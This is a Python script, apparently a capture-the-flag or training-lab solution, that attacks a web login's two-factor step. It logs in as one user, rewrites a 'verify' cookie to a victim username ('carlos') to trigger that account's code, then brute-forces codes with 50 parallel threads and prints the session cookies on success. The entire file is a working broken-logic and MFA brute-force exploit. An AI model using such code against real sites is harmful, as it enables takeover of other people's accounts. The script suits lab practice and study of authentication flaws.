import requests
import urllib3
from urllib.parse import urlparse
urllib3.disable_warnings(urllib3.exceptions.NotOpenSSLWarning)
import time
from datetime import timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
import os

# if running the script repeatedly, hard code the URL here for convenience
# otherwise, you'll need to provide the URL in the terminal when running the program
hardcodedurl = ""

validUserLogin = ["wiener", "peter"]
targetUsername = "carlos"
targetUsernameCookieValue = "verify"
maxRange = 2000 # we only need to check up to 2000, since all codes start with either 0 or 1

def formatTimeInfo(startTime, i, maxRange):
    elapsed = int(time.time() - startTime)
    rate = (i + 1) / (elapsed + 1)
    remaining = int((maxRange - (i + 1)) / rate)
    return (f"/ elapsed: {timedelta(seconds=elapsed)} / remaining: {timedelta(seconds=remaining)}")

def formatProgress(i, maxRange):
    return f"{(i+1)/maxRange*100:5.1f}%"

# check one given MFA code and return None if it doesn't work
def CheckMfaCodeIsCorrect(mfaCodeAttempt, cookies, url):
    try:
        s = requests.Session()
        s.cookies.update(cookies)
        response = s.post(f"{url}/login2", data={"mfa-code": mfaCodeAttempt}, allow_redirects=False)
        if response.status_code != 200: # success!
            return mfaCodeAttempt
        return None
    except requests.exceptions.RequestException:
        return None

print("\n\n\n==== PROGRAM START ====\n")
url = hardcodedurl if hardcodedurl else input("Enter the lab URL: ").strip().rstrip('/')

try:
    print(f"Attempting connection to [{url}]")
    response = requests.get(url, timeout=10)
    response.raise_for_status()
    print(f"Connected")
except requests.exceptions.RequestException as e:
    print(f"ERROR! Could not connect: {e}")
    exit(1)

# attempt login given our valid credentials
sesh = requests.Session()
print(f"Attempting login as user '{validUserLogin[0]}'")
response = sesh.post(f"{url}/login", data={"username": validUserLogin[0], "password": validUserLogin[1]}, allow_redirects=False)
if (response.status_code == 302):
    print(f"Successfully logged in as user '{validUserLogin[0]}'")
else:
    print(f"ERROR! Login failed, check credentials")
    exit(1)

# override the cookie value so we're now logging into our target account
sesh.cookies.set(targetUsernameCookieValue, targetUsername, domain = urlparse(url).netloc)
print(f"Modified cookie value, setting '{targetUsernameCookieValue}' to '{targetUsername}'")

# force target account to generate a 2FA code
print(f"Sending GET request to trigger 2FA code for account {targetUsername}")
sesh.get(f"{url}/login2")

# begin the cracking process
print(f"\n== BEGIN BRUTE FORCE CRACKING (limit: {maxRange}) ==")
startTime = time.time()
print("\033[?25l")  # hide cursor

# use multithreading to speed this up significantly
executor = ThreadPoolExecutor(max_workers=50)
futures = []
completedCount = 0

# queue up and begin firing off separate threads, each attempting one mfa code
for i in range(maxRange):
    mfaCodeAttempt = f"{i:04}"
    future = executor.submit(CheckMfaCodeIsCorrect, mfaCodeAttempt, sesh.cookies, url)
    futures.append(future)

# examine the results of each completed thread
for future in as_completed(futures):
    result = future.result()
    if result:
        print()
        print("CRACKING SUCCESSFUL")
        print(f"MFA code: {result}")
        print(f"= COOKIES =")
        for cookie in sesh.cookies:
            print(f"{cookie.name}: {cookie.value}")
        print("\n==== EXITING PROGRAM ====\n")
        os._exit(0) # needed to exit cleanly from the multithreading
    else:
        completedCount += 1

    print(f"Codes checked: {completedCount:4} [{formatProgress(completedCount, maxRange)}] {formatTimeInfo(startTime, completedCount, maxRange)}", end="\r")


print()
print("CRACKING FAILED :(")
exit(1)